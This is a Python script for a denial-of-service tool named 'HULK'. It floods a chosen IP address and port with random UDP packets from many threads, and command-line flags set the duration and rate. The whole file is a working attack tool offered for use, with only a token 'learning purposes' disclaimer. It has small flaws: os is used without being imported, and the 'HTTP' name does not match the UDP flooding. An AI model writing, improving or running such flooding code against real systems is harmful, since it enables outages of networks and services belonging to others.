import socket
import random
import threading
import ipaddress
import time
import argparse
import platform
import logging

logging.basicConfig(filename="hulk.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        print(" ✘ Invalid IP address.")
        return False

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        else:
            print(" ✘ Port must be between 1 and 65535.")
            return None
    except ValueError:
        print(" ✘ Invalid port number.")
        return None

class HulkAttack:
    def __init__(self, ip, port, threads=10, duration=None, rate_limit=None):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.rate_limit = rate_limit
        self.sent = 0
        self.bytes_data = random._urandom(1490)
        self.lock = threading.Lock()

    def validate_target(self):
        return validate_ip(self.ip) and validate_port(self.port)

    def send_packets(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start_time = time.time()
        while True:
            if self.duration and (time.time() - start_time) > self.duration:
                break
            try:
                sock.sendto(self.bytes_data, (self.ip, self.port))
                with self.lock:
                    self.sent += 1
                    logging.info(f"Sent packet {self.sent} to {self.ip}:{self.port}")
                    print(f"[+] Successfully sent {self.sent} packet to {self.ip} through port {self.port}")
                if self.rate_limit:
                    time.sleep(1 / self.rate_limit)
            except socket.error as e:
                print(f"[-] Network error: {e}")
                break

    def start(self):
        if not self.validate_target():
            print("[-] Invalid target. Exiting...")
            return
        clear_screen()
        print("""
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
    *  [!] Disclaimer: Use for learning purposes   *
    ************************************************
        """)
        print(f"[+] HULK is attacking {self.ip} on port {self.port}")
        logging.info(f"Attack started on {self.ip}:{self.port}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send_packets)
            t.daemon = True
            threads.append(t)
            t.start()
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n[-] Ctrl+C Detected... Stopping attack")
        print("[-] Attack completed.")

def main():
    parser = argparse.ArgumentParser(description="HTTP Unbearable Load King (HULK)")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--rate", type=int, help="Packets per second")
    args = parser.parse_args()

    attack = HulkAttack(args.ip, args.port, args.threads, args.duration, args.rate)
    attack.start()

if __name__ == "__main__":
    main()
